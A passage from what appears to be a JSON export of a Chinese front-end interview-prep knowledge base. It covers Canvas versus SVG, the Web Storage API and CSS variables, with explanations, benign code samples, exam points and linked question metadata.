的矢量图形标准，它可以用来描述二维图形和图形应用程序，使用标签绘制不规则矢量图。与像素图形不同，SVG 图形是基于矢量的，它使用数学公式来描述图形形状，因此可以自由缩放而不失真。\n\n### 常用属性\n\n| 属性 | 效果 |\n| --- | --- |\n| `width`, `height` | 元素的宽度和高度 |\n| `viewBox` | 元素的视口大小和位置 |\n| `viewBox` | 元素的填充颜色 |\n| `viewBox` | 元素的描边颜色和宽度 |\n| `opacity` | 元素的不透明度 |\n| `transform` | 元素的变换，如旋转、缩放、平移等 |\n| `d` | 用于路径元素（如 `<path>`）的属性，指定路径的数据 |\n| `text-anchor` , `alignment-baseline` | 用于文本元素（如 `<text>`）的属性，指定文本的水平和垂直对齐方式 |\n| `x` , `y` | 用于定位元素的属性，指定元素的 x 坐标和 y 坐标 |\n\n### 优缺点\n\n#### 优点\n\n-   具有良好的跨浏览器兼容性、可搜索性和可访问性\n-   支持丰富的图形效果和动画\n-   可以通过 CSS 和 JavaScript 来进行样式和交互控制，可以与其他 Web 技术结合使用，实现更丰富的Web应用\n\n#### 缺点\n\n对于复杂的图形或大量的数据，SVG 可能会影响性能\n\n## 使用实例\n\n1.  在 HTML 页面中添加 `<svg>` 元素，并设置其宽度和高度\n\n```arduino\n<svg width=\"200\" height=\"200\"></svg>\n```\n\n2.  在 `<svg>` 元素中添加各种 SVG 元素来描述图形形状。使用 `<rect>` 元素和 `<circle>` 元素来绘制一个红色的矩形和一个黄色的圆形，同时设置了边框的颜色、宽度和样式。\n\n```arduino\n<svg width=\"200\" height=\"200\">\n  <rect x=\"50\" y=\"50\" width=\"100\" height=\"100\" fill=\"red\" stroke=\"black\" stroke-width=\"2\"/>\n  <circle cx=\"100\" cy=\"100\" r=\"50\" fill=\"yellow\" stroke=\"black\" stroke-width=\"2\"/>\n</svg>\n```\n\n3.  使用 CSS 来设置 SVG 元素的样式。使用 CSS 来设置 SVG 元素的边框和背景颜色。\n\n```css\nsvg {\n    border: 1px solid black;\n    background-color: #eee;\n}\n```\n\n4.  使用 JavaScript 来实现交互效果和动画效果。使用 JavaScript 来监听圆形的点击事件，并在点击时将圆形的半径设置为 75，从而实现一个简单的动画效果。\n\n```javascript\nconst circle = document.querySelector('circle');\ncircle.addEventListener('click', () => {\n  circle.setAttribute('r', '75');\n});\n```\n\n## 3.Canvas 和 SVG 的区别\n\n-   Canvas 是用笔刷来绘制 2D 图形的\n-   SVG 则是用标签来绘制不规则矢量图\n\n### 相同点\n\n-   都是用来绘制 2D 图形的\n\n### 不同点\n\n-   SVG 画的是矢量图（不依赖分辨率），Canvas 画的是位图（依赖分辨率）\n-   SVG 节点过多时渲染较慢， Canvas 性能好一些，但写起来更复杂\n-   SVG 支持分层和事件，Canvas 不支持，但可以使用库来实现\n-   SVG 每一个图形都是一个 `DOM` 元素，Canvas 则是单个 `HTML`元素，相当于 `<img>`\n-   SVG 可以通过脚本和CSS进行修改，Canvas 则只能通过脚本修改\n-   SVG 支持事件处理器，Canvas 则不支持事件处理器\n-   SVG中，将每个绘制的形状记住为对象。如果更改了SVG对象的属性，则浏览器可以自动重新呈现形状；Canvas 由像素呈现，旦图形在画布中绘制完成，浏览器撒手不管了。如果需要更改其位置，则需要重新绘制整个场景，其中许多对象会被频繁重绘\n\n\n## 4. 优势总结\n\n### Canvas优势\n\n-   绘制出来的图形是位图具有很好的渲染性能\n-   适合数据量比较大（>1000）\n-   大量图形高频率交互\n-   适合游戏\n-   可以导出jpg/png图片\n\n### SVG优势\n\n-   矢量图放大不失真\n-   支持事件处理器\n-   文字独立、可编辑可搜索\n\n## 对比表格\n\n|  | Canvas | SVG |\n| --- | --- | --- |\n| 大数据量 | ✅ | ❌ |\n| 高交互场景 | ✅ | ❌ |\n| 可导出图片 | ✅ | ❌ |\n| 放大不失真 | ❌ | ✅ |\n| 支持事件处理 | ❌ | ✅ |\n| 文字可编辑 | ❌ | ✅ |",
    "testPoint": "考察点通常会围绕 **Canvas** 和 **SVG** 的基本概念、性能、事件处理、动画、兼容性等展开，重点在于理解它们各自的优缺点，并能够根据项目需求做出合适的技术选择。\n\n### 1. **Canvas 和 SVG 的基本区别**\n   - **Canvas** 是基于位图的绘图模型，通过 JavaScript 动态绘制图形。适合大量对象的实时渲染（如游戏）。\n   - **SVG** 是基于矢量的绘图模型，使用 XML 定义图形。适合处理复杂的静态图形和响应式设计。\n\n   **考点**：何时使用 Canvas，何时使用 SVG，以及它们的优缺点。\n\n### 2. **绘图方式**\n   - **Canvas**：使用 JavaScript API 来绘制图形和处理渲染（例如 `fillRect()`、`stroke()` 等）。\n   - **SVG**：使用 XML 标记语言来定义图形元素（如 `<circle>`、`<rect>`、`<path>` 等）。\n\n   **考点**：如何使用 Canvas API 和 SVG 元素绘制基本图形。\n\n### 3. **性能**\n   - **Canvas**：基于像素操作，适合绘制大量复杂的、需要高频次更新的图像（如游戏、动画），但随着图形复杂度增加，性能可能下降。\n   - **SVG**：基于 DOM 树，处理较多复杂对象时可能导致性能瓶颈，但对于简单、静态、少量对象的处理性能较好。\n\n   **考点**：讨论 Canvas 与 SVG 在性能上的差异，尤其是大规模动画和动态图形的性能优化。\n\n### 4. **可伸缩性**\n   - **Canvas**：由于是位图，放大后图像质量下降，可能会出现模糊。\n   - **SVG**：基于矢量，可以无损缩放，适合响应式设计。\n\n   **考点**：如何在需要自适应、无损缩放时选择 SVG。\n\n### 5. **事件处理**\n   - **Canvas**：不支持 DOM 事件，必须通过计算坐标和事件侦听手动处理用户交互（如点击、悬停）。\n   - **SVG**：支持标准的 DOM 事件，可以直接绑定事件监听器（如 `onclick`、`onmouseover`）。\n\n   **考点**：如何在 Canvas 和 SVG 中处理用户交互和事件监听。\n\n### 6. **文件大小与加载时间**\n   - **Canvas**：渲染的图形不会影响 DOM 大小，但可能增加页面的 JavaScript 执行量。\n   - **SVG**：作为 XML 文件嵌入页面，增加 DOM 大小，可能影响复杂图形的渲染速度。\n\n   **考点**：如何权衡文件大小和加载速度问题，尤其是在复杂图形或高分辨率下。\n\n### 7. **图形操作**\n   - **Canvas**：绘制后，无法直接操作已绘制的图形，更新需要重绘整个画布。\n   - **SVG**：因为是 DOM 元素，图形对象可以直接操作（通过 JavaScript 或 CSS），无需重新渲染整个图像。\n\n   **考点**：何时选择 Canvas 或 SVG 来动态操作图形元素。\n\n### 8. **动画**\n   - **Canvas**：需要通过 `requestAnimationFrame()` 和 JavaScript 控制动画，适合复杂、实时更新的动画效果。\n   - **SVG**：可以通过 CSS 和 SMIL（可缩放矢量图形语言）实现简单的动画，也可以借助 JavaScript 控制。\n\n   **考点**：如何使用 Canvas 实现复杂动画，以及如何使用 CSS 动画和 JavaScript 操控 SVG 动画。\n\n### 9. **兼容性**\n   - **Canvas** 和 **SVG** 都被现代浏览器广泛支持，但在性能和优化上的表现可能有所不同，特别是在移动设备上。\n\n   **考点**：Canvas 和 SVG 的浏览器支持和兼容性问题。\n\n### 10. **实际应用场景**\n   - **Canvas**：适合游戏开发、数据可视化、图像处理、实时绘图等场景。\n   - **SVG**：适合图标、简单的图形设计、数据可视化（如图表）、地图等静态或交互式场景。\n\n   **考点**：在具体项目中，如何根据需求选择 Canvas 或 SVG 作为渲染技术。",
    "exerciseKeyList": "[\"ca26a4cb-9880-4755-8ece-9c9a8f50f5b9\",\"1461ed4b-a23d-4ae7-9b00-78d10a57eb29\",\"64cfe53d-5551-47b4-97bc-720a146723af\",\"c8a51567-945f-461d-b632-0209dd1917f5\",\"984c0b83-46a5-4d36-ae41-8e612bac2943\",\"b866f9eb-e02a-4220-b35a-013db09ce0c2\",\"87408912-b244-4727-951c-65993c6dbcff\",\"5570174b-5bd1-4e00-a9cf-49f6ae227758\"]",
    "vipLimit": 0,
    "level": 2,
    "pointOrder": 9,
    "createAt": "2024-10-09T01:31:55.000Z",
    "updateAt": "2024-11-06T06:13:21.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "1461ed4b-a23d-4ae7-9b00-78d10a57eb29",
        "title": "canvas 性能为何会比 html/css 好？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-15T18:48:22.000Z"
      },
      {
        "exerciseKey": "5570174b-5bd1-4e00-a9cf-49f6ae227758",
        "title": "canvas在标签上设置宽高，与在style中设置宽高有什么区别？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T05:45:02.000Z",
        "updateAt": "2021-07-04T16:01:29.000Z"
      },
      {
        "exerciseKey": "64cfe53d-5551-47b4-97bc-720a146723af",
        "title": "为何现在市面上做表格渲染可视化技术的，大多数都是 canvas ， 而很少用 svg 的？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:22.000Z",
        "updateAt": "2024-09-20T01:06:58.000Z"
      },
      {
        "exerciseKey": "87408912-b244-4727-951c-65993c6dbcff",
        "title": "怎么解决canvas中获取跨域图片数据的问题？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-03-08T15:35:58.000Z",
        "updateAt": "2024-08-10T17:06:15.000Z"
      },
      {
        "exerciseKey": "984c0b83-46a5-4d36-ae41-8e612bac2943",
        "title": "canvas 和 webgl 有什么区别？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-06-09T06:53:03.000Z",
        "updateAt": "2024-07-19T10:32:56.000Z"
      },
      {
        "exerciseKey": "b866f9eb-e02a-4220-b35a-013db09ce0c2",
        "title": "我现在有一个canvas，上面随机布着一些黑块，请实现方法，计算canvas上有多少个黑块。",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-03-08T15:40:17.000Z",
        "updateAt": "2022-03-08T23:40:20.000Z"
      },
      {
        "exerciseKey": "c8a51567-945f-461d-b632-0209dd1917f5",
        "title": "Canvas和SVG有什么区别？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2022-06-25T06:33:17.000Z",
        "updateAt": "2024-07-22T10:06:55.000Z"
      },
      {
        "exerciseKey": "ca26a4cb-9880-4755-8ece-9c9a8f50f5b9",
        "title": "canvas 与 svg 在可视化领域优劣如何",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:36.000Z",
        "updateAt": "2024-08-15T09:19:52.000Z"
      }
    ]
  },
  "120": {
    "id": 120,
    "tagId": 12,
    "title": "Web Storage",
    "explanation": "## 一、 简介\n\n浏览器本地存储是指浏览器提供的一种机制，允许 Web 应用程序在浏览器端存储数据，以便在用户下次访问时可以快速获取和使用这些数据。一共两种存储方式：localStorage 和 sessionStorage。下面介绍下两种缓存的特性和在内部平台的一些应用。\n\n## 二、localStorage 和 sessionStorage\n\n### 2.1、区别\n\nlocalStorage 和 sessionStorage 的主要区别是生命周期，具体区别如下：\n\n|  | localStorage | sessionStorage |\n| --- | --- | --- |\n| 生命周期 | 持久化存储：除非自行删除或清除缓存，否则一直存在 | 会话级别的存储：浏览器标签页或窗口关闭 |\n| 作用域 | 相同浏览器，同域名，不同标签，不同窗口 | 相同浏览器，同域名，同源窗口 |\n| 获取方式 | window.localStorage | window.sessionStorage |\n| 存储容量 | 5M | 5M |\n\n容量限制的目的是防止滥用本地存储空间，导致用户浏览器变慢。\n\n### 2.2、浏览器兼容性\n\n1）现在的浏览器基本上都是支持这两种 Storage 特性的。各浏览器支持版本如下：\n\n|  | Chrome | Firefox | IE | Opera | Safari | Android | Opera Mobile | Safari Mobile |\n| --- | --- | --- | --- | --- | --- | --- | --- | --- |\n| localStorage | 4 | 3.5 | 8 | 10.5 | 4 | 2.1 | 11 | iOS 3.2 |\n| sessionStorage | 5 | 2 | 8 | 10.5 | 4 | 2.1 | 11 | iOS 3.2 |\n\n2）如果使用的是老式浏览器，比如Internet Explorer 6、7 或者其他，就需要在使用前检测浏览器是否支持本地存储或者是否被禁用。以 localStorage 为例：\n\n```scss\nif(window.localStorage){\n  alert(\"浏览器支持 localStorage\");\n} else {\n  alert(\"浏览器不支持 localStorage\");\n}\n```\n\n3）某些浏览器版本使用过程中，会出现 Storage 不能正常使用的情况，记得添加 try/catch。以 localStorage 为例：\n\n```erlang\nif(window.localStorage){\n  try {\n    localStorage.setItem(\"username\", \"name\");\n    alert(\"浏览器支持 localStorage\");\n  } catch (e) {\n    alert(\"浏览器支持 localStorage 后不可使用\");\n  }\n} else {\n  alert(\"浏览器不支持 localStorage\");\n}\n\n```\n\n## 三、使用说明\n\n### 3.1、API介绍\n\nlocalStorage 和 sessionStorage 提供了相同的方法进行存储、检索和删除。常用的方法如下：\n\n1.  设置数据：setItem(key, value)\n\n存储的值可以是字符串、数字、布尔、数组和对象。对象和数组必须转换为 string 进行存储。JSON.parse() 和 JSON.stringify() 方法可以将数组、对象等值类型转换为字符串类型，从而存储到 Storage 中；\n\n```javascript\nlocalStorage.setItem(\"username\", \"name\"); // \"name\"\nlocalStorage.setItem(\"count\", 1); // \"1\"\nlocalStorage.setItem(\"isOnline\", true); // \"true\"\nsessionStorage.setItem(\"username\", \"name\");\n// user 存储时，先使用 JSON 序列化，否则保存的是[object Object]\nconst user = { \"username\": \"name\" };\nlocalStorage.setItem(\"user\", JSON.stringify(user));\nsessionStorage.setItem(\"user\", JSON.stringify(user));\n```\n\neg：数据没有序列化，导致保存的数据异常![图片](https://static.ecool.fun//article/aca694cc-6425-4a87-8572-a7616b25109e.jpeg)\n\n2.  获取数据：getItem(key)\n\n如果 key 对应的 value 获取不到，则返回值是 null；\n\n```ini\nconst usernameLocal = localStorage.getItem(\"username\");\nconst usernameSession = sessionStorage.getItem(\"username\");\n// 获取到的数据为string，使用时反序列化数据\nconst userLocal = JSON.parse(localStorage.getItem(\"user\"));\nconst userSession = JSON.parse(sessionStorage.getItem(\"user\"));\n```\n\n3.  删除数据：removeItem(key)；\n\n```javascript\nlocalStorage.removeItem(\"username\");\nsessionStorage.removeItem(\"username\");\n```\n\n4.  清空数据：clear()；\n\n```ini\nlocalStorage.clear();\nsessionStorage.clear();\n```\n\n5.  在不确定是否存在 key 的情况下，可以使用 hasOwnProperty() 进行检查;\n\n```ruby\nlocalStorage.hasOwnProperty(\"userName\"); // true\nsessionStorage.hasOwnProperty(\"userName\"); // false\n```\n\n6.  当然，也可以使用 Object.keys() 查看所有存储数据的键;\n\n```css\nObject.keys(localStorage); // ['username']\nObject.keys(sessionStorage);\n```\n\n### 3.2、浏览器查看\n\n本地存储的内容可以在浏览器中直接查看，以 Chrome 为例，按住键盘 F12 进入开发者工具后，选择 Application，然后就能在左边 Storage 列表中找到 localStorage 和 sessionStorgae。![图片](https://static.ecool.fun//article/cd81b1e9-00a9-4db0-bb6f-f243d05bd307.jpeg)\n\n### 3.3、监听\n\n当存储的数据发生变化时，其他页面通过监听 storage 事件，来获取变更前后的值，以及根据值的变化来处理页面的展示逻辑。\n\nJS 原生监听事件，只能够监听同源非同一个页面中的 storage 事件，如果想监听同一个页面的，需要改写原生方法，抛出自定义事件来监听。具体如下：\n\n1.  监听同源非同一个页面\n\n直接在其他页面添加监听事件即可。\n\neg：同域下的 A、B 两个页面，A 修改了 localStorage，B 页面可以监听到 storage 事件。\n\n```javascript\nwindow.addEventListener(\"storage\", () => {\n  // 监听 username 值变化\n  if (e.key === \"username\") {\n    console.log(\"username 旧值：\" + e.oldValue + \"，新值：\" + e.newValue);\n  }\n})\n```\n\n注：\n\n-   当两次 setItem 更新的值一样时，监听方法是不会触发的；\n-   storage 事件只能监听到 localStorage 的变化。\n\n2.  监听同一个页面\n\n重写 Storage 的 setItem 事件，同理，也可以监听删除事件 removeItem 和获取事件 getItem。\n\n```ini\n(() => {\n  const originalSetItem = localStorage.setItem;\n  // 重写 setItem 函数\n  localStorage.setItem = function (key, val) {\n    let event = new Event(\"setItemEvent\");\n    event.key = key;\n    event.newValue = val;\n    window.dispatchEvent(event);\n    originalSetItem.apply(this, arguments);\n  };\n})();\n\nwindow.addEventListener(\"setItemEvent\", function (e) {\n  // 监听 username 值变化\n  if (e.key === \"username\") {\n    const oldValue = localStorage.getItem(e.key);\n    console.log(\"username 旧值：\" + oldValue + \"，新值：\" + e.newValue);\n  }\n});\n```\n\n## 四、存储\n\n浏览器默认能够存储 5M 的数据，但实际上，浏览器并不会为其分配特定的存储空间，而是根据当前浏览器的空闲空间来判断能够分配多少存储空间。\n\n### 4.1、存储容量\n\n可以使用 Storage 的 length 属性，对存储容量进行测算，以 localStorage 为例：\n\n```javascript\nlet str = \"0123456789\";\nlet temp = \"\";\n// 先生成一个 10KB 的字符串\nwhile (str.length !== 10240) {\n  str = str + \"0123456789\";\n}\n// 清空\nlocalStorage.clear();\n// 计算总量\nconst computedTotal = () => {\n  return new Promise((resolve) => {\n    // 往 localStorage 中累积存储 10KB\n    const timer = setInterval(() => {\n      try {\n        localStorage.setItem(\"temp\", temp);\n      } catch (e) {\n        // 报错说明超出最大存储\n        resolve(temp.length / 1024);\n        clearInterval(timer);\n        // 统计完记得清空\n        localStorage.clear();\n      }\n      temp += str;\n    }, 0);\n  });\n};\n// 计算使用量\nconst computedUse = () => {\n  let cache = 0;\n  for (let key in localStorage) {\n    if (localStorage.hasOwnProperty(key)) {\n      cache += localStorage.getItem(key).length;\n    }\n  }\n  return (cache / 1024).toFixed(2);\n};\n\n(async () => {\n  const total = await computedTotal();\n  let use = \"0123456789\";\n  for (let i = 0; i < 1000; i++) {\n    use += \"0123456789\";\n  }\n  localStorage.setItem(\"use\", use);\n  const useCache = computedUse();\n\n  console.log(`最大容量${total}KB`);\n  console.log(`已用${useCache}KB`);\n  console.log(`剩余可用容量${total - useCache}KB`);\n})();\n```\n\n可见在 Chrome 浏览器下，localStorage 有 5M 容量。![图片](https://static.ecool.fun//article/5f0c9635-6958-4bd4-9377-373a7615a1c7.jpeg)\n\n### 4.2、存储性能\n\n在某些特殊场景下，需要存储大数据，为了更好的利用 Storage 的存储空间，可以采取以下解决方案，但不应该过于频繁地将大量数据存储在 Storage 中，因为在写入数据时，会对整个页面进行阻塞（不推荐这种方式）。\n\n1.  压缩数据\n\n可以使用数据压缩库对 Storage 中的数据进行压缩，从而减小数据占用的存储空间。\n\neg：使用 lz-string 库的 compress() 函数将数据进行压缩，并将压缩后的数据存储到 localStorage 中。\n\n```ini\nconst LZString = require(\"lz-string\");\nconst data = \"This is a test message\";\n// 压缩\nconst compressedData = LZString.compress(data);\nlocalStorage.setItem(\"test\", compressedData);\n// 解压\nconst decompressedData = LZString.decompress(localStorage.getItem(\"test\"));\n```\n\n2.  分割数据\n\n将大的数据分割成多个小的片段存储到 Storage 中，从而减小单个数据占用的存储空间。\n\neg：将用户数据分割为单项存储到 localStorage 中。\n\n```vbnet\nfor (const key in userInfo) {\n  localStorage.setItem(key, userInfo[key]);\n}\n```\n\n![图片](https://static.ecool.fun//article/ab75c8b1-700f-4cae-9831-86b47593b0b8.jpeg)\n\n3.  取消不必要的数据存储\n\n可以在代码中取消一些不必要的数据存储，从而减小占用空间。\n\neg：只存储用到的用户名、公司主体和后端所在环境字段信息。\n\n```vbnet\nfor (const key in userInfo) {\n  if ([\"userName\", \"legalEntityName\", \"isOnline\"].includes(key)) {\n    localStorage.setItem(key, userInfo[key]);\n  }\n}\n```\n\n![图片](https://static.ecool.fun//article/f94cb7e9-9b02-4339-9da4-0d308f6f27f4.jpeg)\n\n4.  设置过期时间\n\nlocalStorage 是不支持过期时间的，在存储信息过多后，会拖慢浏览器速度，也会因为浏览器存储容量不够而报错，可以封装一层逻辑来实现设置过期时间，以达到清理的目的。\n\n```javascript\n// 设置\nfunction set(key, value){\n  const time = new Date().getTime(); //获取当前时间\n  localStorage.setItem(key, JSON.stringify({value, time})); //转换成json字符串\n}\n// 获取\nfunction get(key, exp){\n  // exp 过期时间\n  const value = localStorage.getItem(key); \n  const valueJson = JSON.parse(value); \n  //当前时间 - 存储的创建时间 > 过期时间\n  if(new Date().getTime() - valueJson.time > exp){\n    console.log(\"expires\"); //提示过期\n  } else {\n    console.log(\"value:\" + valueJson.value);\n  }\n}\n```\n\n## 五、应用\n\n### 5.1、使用习惯记录\n\n用来缓存一些筛选项数据，保存用户习惯信息，起到避免多次重复操作的作用。\n\neg：在 beetle 工程列表中，展示了自已权限下所有 beetle 的项目，对于参与项目多和参与项目少的人，操作习惯是不同的，由此，记录收藏功能状态解决了这一问题，让筛选项记住用户选择，方便下次使用。![图片](https://static.ecool.fun//article/5a278e26-276f-4f77-9e3e-379a439cd980.jpeg)\n\n![图片](https://static.ecool.fun//article/b64fcdb1-fae9-4e49-add2-bc92f674cba3.jpeg)\n\n在开发使用中，直接获取 localStorage.getItem('isFavor') 作为默认值展示，切换后使用 localStorage.setItem() 方法更新保存内容。\n\n```javascript\n// 获取\nconst isFavor = localStorage.getItem('isFavor');\nthis.state = {\n  isFavor: isFavor !== null ? Number(isFavor) : EngineeringTypeEnum.FAVOR,\n};\n// 展示默认值\n<Form.Item name='isFavor' initialValue={this.state.isFavor}>\n  <Select\n    placeholder='筛选收藏的工程'\n    onChange={(e) => this.changeFavor(e)}\n    {...searchSmallFormProps}\n  >\n      {EngineeringTypeEnum.property.map(e => (<Option key={e.id} value={e.id}>{e.name}</Option>))}\n  </Select>\n</Form.Item>\n// 变更\nchangeFavor = (e) => {\n  localStorage.setItem('isFavor', e);\n  this.setState({ isFavor: e });\n};\n```\n\n### 5.2、首次打开提示\n\n用来缓存用户导览，尤其是只需要出现一次的操作说明弹窗等。\n\neg：当第一次或者清空缓存后登录，页面需要出现操作指南和用户手册的弹窗说明。![图片](https://static.ecool.fun//article/a23ea065-8de8-4362-b1f1-59e1efbf9eca.jpeg)\n\n在开发使用中，注意存储的数据类型为 string，转成布尔值是为了在插件中方便控制弹窗的显示隐藏。\n\n```ini\n// 获取\nconst operationVisible = localStorage.getItem('operationVisible');\nthis.state = {\n  operationVisible: operationVisible === null || operationVisible === 'true' ? true : false,\n};\n// 控制展示\n<Modal\n  title='操作指南'\n  open={this.state.operationVisible}\n  onCancel={() => { \n    this.setState({ operationVisible: false }); \n    localStorage.setItem('operationVisible', false); \n  }}\n  footer={null}\n  destroyOnClose={true}\n>\n  <Divider orientation='left'>动作</Divider>\n  <p>接口 》 用例 》 用例集，3级结构满足不了后续的使用，因此增加【动作】这一层级，【动作】是接口测试的最小单元，多个【动作】可以组合成一个用例，多个用例可以聚合为用例集；</p>\n  <Image src={OperationGuidePng} preview={false} />\n</Modal>\n```\n\n### 5.3、减少重复访问接口\n\n在浏览页面时，会遇到一些经常访问但返回数据不更新的接口，这种特别适合用做页面缓存，只在页面打开的时候访问一次，其他时间获取缓存数据即可。\n\neg：在我们的一些内部系统中，用户信息是每个页面都要用到的，尤其是 userId 字段，会与每个获取数据接口挂钩，但这个数据是不会变的，一直请求是没有意义的，为减少接口的访问次数，可以将主要数据缓存在 localStorage 内，方便其他接口获取。",
    "testPoint": "面试中关于 **Web Storage** 的问题通常会从基础概念、API 使用、实际应用场景和安全性等多个角度考察。理解如何选择合适的存储机制、如何安全地存储数据，以及在不同的使用场景中应用 Web Storage，都是常见的考点。\n\n考察点通常围绕以下几个方面展开：\n\n### 1. **localStorage 与 sessionStorage 的区别**\n   - **localStorage**：数据没有过期时间，保存在用户关闭浏览器之后依然存在，除非用户手动清除。\n   - **sessionStorage**：数据仅在当前会话中有效，一旦关闭浏览器或页面，数据就会被清除。\n\n   **考点**：解释 localStorage 和 sessionStorage 的主要区别，以及如何选择它们。\n\n### 2. **API 使用**\n   - **存储数据**：`localStorage.setItem(key, value)` 和 `sessionStorage.setItem(key, value)`\n   - **读取数据**：`localStorage.getItem(key)` 和 `sessionStorage.getItem(key)`\n   - **删除数据**：`localStorage.removeItem(key)` 和 `sessionStorage.removeItem(key)`\n   - **清空所有数据**：`localStorage.clear()` 和 `sessionStorage.clear()`\n   \n   **考点**：编写代码片段演示如何使用 Web Storage API 存取、删除和清空数据。\n\n### 3. **数据存储类型**\n   - **localStorage** 和 **sessionStorage** 只能存储字符串类型数据。\n   - 如果要存储复杂数据类型（如对象或数组），需要使用 `JSON.stringify()` 转换为字符串，取出时用 `JSON.parse()` 解析。\n\n   **考点**：如何处理非字符串类型的数据（如对象或数组）进行存储。\n\n   **示例**：\n   ```javascript\n   const user = { name: \"John\", age: 30 };\n   localStorage.setItem(\"user\", JSON.stringify(user));\n   const storedUser = JSON.parse(localStorage.getItem(\"user\"));\n   ```\n\n### 4. **存储大小限制**\n   - **localStorage** 和 **sessionStorage** 每个域名的存储大小通常为 **5MB**，具体数值可能因浏览器而异。\n   \n   **考点**：了解 Web Storage 的大小限制，以及如何处理超出存储空间的情况。\n\n### 5. **浏览器兼容性**\n   - **localStorage** 和 **sessionStorage** 被现代主流浏览器广泛支持，但在早期浏览器（如 IE8 及之前）中可能不完全支持。\n   \n   **考点**：了解 Web Storage 的浏览器兼容性问题，以及如何在不支持的浏览器中实现兼容性。\n\n### 6. **与 Cookies 的比较**\n   - **Web Storage**：主要用于客户端存储，不会自动随着 HTTP 请求发送到服务器。\n   - **Cookies**：用于在客户端和服务器之间传递数据，会随着每次请求自动发送。\n   - **大小限制**：Cookies 通常限制为 4KB，而 Web Storage 的限制较大（通常为 5MB）。\n\n   **考点**：解释 Web Storage 和 Cookies 的区别，以及在什么场景下选择使用它们。\n\n### 7. **安全性**\n   - **Web Storage** 没有跨域共享机制，数据只在同一域名下可用。\n   - 但是 Web Storage 仍然容易被 JavaScript 劫持或篡改，因此要确保使用 HTTPS，并妥善处理敏感信息。\n\n   **考点**：如何确保存储的数据安全，是否可以将敏感数据存储在 localStorage 中，以及有哪些潜在的安全风险（如 XSS 攻击）。\n\n### 8. **事件监听**\n   - 使用 `storage` 事件监听 Web Storage 数据的变化。此事件在同一域的多个窗口或标签页之间共享数据时特别有用。\n\n   **考点**：如何使用 `window.addEventListener('storage', callback)` 监听 localStorage 的变化，并如何在跨标签页共享数据时处理。\n\n   **示例**：\n   ```javascript\n   window.addEventListener('storage', (event) => {\n       console.log('Storage key changed:', event.key);\n   });\n   ```\n\n### 9. **使用场景**\n   - **localStorage** 常用于长期保存用户偏好设置、主题颜色等持久化信息。\n   - **sessionStorage** 用于保存一次性数据或会话相关的状态，例如表单数据的临时保存。\n\n   **考点**：如何根据使用场景选择 localStorage 或 sessionStorage，并解释具体的使用场景。\n\n### 10. **性能影响**\n   - 存储过大数据时，可能会导致页面性能下降，尤其是在大规模频繁访问数据的情况下。\n\n   **考点**：讨论 Web Storage 的性能影响，特别是在大量数据存储和读取时，如何优化性能。\n",
    "exerciseKeyList": "[\"ec9fd724-c3ab-453f-818c-a4909155c5f6\",\"718abe6b-08ab-4669-bc33-187fabad8fec\"]",
    "vipLimit": 0,
    "level": 1,
    "pointOrder": 10,
    "createAt": "2024-10-09T01:39:25.000Z",
    "updateAt": "2024-11-06T06:13:21.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "718abe6b-08ab-4669-bc33-187fabad8fec",
        "title": "cookie、localStorage和sessionStorage 三者之间有什么区别",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-03-15T16:01:01.000Z",
        "updateAt": "2024-08-10T17:06:17.000Z"
      },
      {
        "exerciseKey": "ec9fd724-c3ab-453f-818c-a4909155c5f6",
        "title": "如何实现可过期的 localStorage 数据?",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:41.000Z",
        "updateAt": "2024-08-14T20:16:26.000Z"
      }
    ]
  },
  "121": {
    "id": 121,
    "tagId": 11,
    "title": "变量",
    "explanation": "## 一、变量的声明\n\n声明变量的时候，变量名前面要加两根连词线（`--`）。\n\n> ```css\n> \n> body {\n>   --foo: #7F583F;\n>   --bar: #F7EFD2;\n> }\n> ```\n\n上面代码中，`body`选择器里面声明了两个变量：`--foo`和`--bar`。\n\n它们与`color`、`font-size`等正式属性没有什么不同，只是没有默认含义。所以 CSS 变量（CSS variable）又叫做**\"CSS 自定义属性\"**（CSS custom properties）。因为变量与自定义的 CSS 属性其实是一回事。\n\n你可能会问，为什么选择两根连词线（`--`）表示变量？因为`$foo`被 Sass 用掉了，`@foo`被 Less 用掉了。为了不产生冲突，官方的 CSS 变量就改用两根连词线了。\n\n各种值都可以放入 CSS 变量。\n\n> ```css\n> \n> :root{\n>   --main-color: #4d4e53;\n>   --main-bg: rgb(255, 255, 255);\n>   --logo-border-color: rebeccapurple;\n> \n>   --header-height: 68px;\n>   --content-padding: 10px 20px;\n> \n>   --base-line-height: 1.428571429;\n>   --transition-duration: .35s;\n>   --external-link: \"external link\";\n>   --margin-top: calc(2vh + 20px);\n> }\n> ```\n\n变量名大小写敏感，`--header-color`和`--Header-Color`是两个不同变量。\n\n## 二、var() 函数\n\n`var()`函数用于读取变量。\n\n> ```css\n> \n> a {\n>   color: var(--foo);\n>   text-decoration-color: var(--bar);\n> }\n> ```\n\n`var()`函数还可以使用第二个参数，表示变量的默认值。如果该变量不存在，就会使用这个默认值。\n\n> ```css\n> \n> color: var(--foo, #7F583F);\n> ```\n\n第二个参数不处理内部的逗号或空格，都视作参数的一部分。\n\n> ```apache\n> \n> var(--font-stack, \"Roboto\", \"Helvetica\");\n> var(--pad, 10px 15px 20px);\n> ```\n\n`var()`函数还可以用在变量的声明。\n\n> ```css\n> \n> :root {\n>   --primary-color: red;\n>   --logo-text: var(--primary-color);\n> }\n> ```\n\n注意，变量值只能用作属性值，不能用作属性名。\n\n> ```css\n> \n> .foo {\n>   --side: margin-top;\n>   /* 无效 */\n>   var(--side): 20px;\n> }\n> ```\n\n上面代码中，变量`--side`用作属性名，这是无效的。\n\n## 三、变量值的类型\n\n如果变量值是一个字符串，可以与其他字符串拼接。\n\n> ```css\n> \n> --bar: 'hello';\n> --foo: var(--bar)' world';\n> ```\n\n利用这一点，可以 debug。\n\n> ```css\n> \n> 